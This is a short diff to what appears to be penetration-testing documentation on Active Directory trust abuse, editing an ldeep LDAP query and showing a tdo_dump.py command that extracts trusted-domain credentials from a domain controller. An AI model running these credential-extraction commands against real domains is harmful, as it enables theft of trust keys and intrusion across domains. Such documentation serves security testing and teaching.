@@ -520,7 +520,7 @@ To work, it requires two GUIDs: the GUID of the `TDO` object for the trusted dom
 ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" search "(objectClass=trustedDomain)" objectguid,distinguishedname
 
 # Retrieve ntDSDSA GUID (with ldeep)
-ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" -b "CN=Configuration,DC=$DOMAIN" search "(name=NTDS Settings)" objectguid,distinguishedname
+ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" -b "CN=Configuration,DC=domain,DC=lab" search "(name=NTDS Settings)" objectguid,distinguishedname
 
 # Extract credentials
 python3 tdo_dump.py -u "$USER" -d "$DOMAIN" -t "$DC_HOST.$DOMAIN" -p "$PASSWORD" --tdo-guid "$TDO_GUID" --dsa-guid "$DSA_GUID"
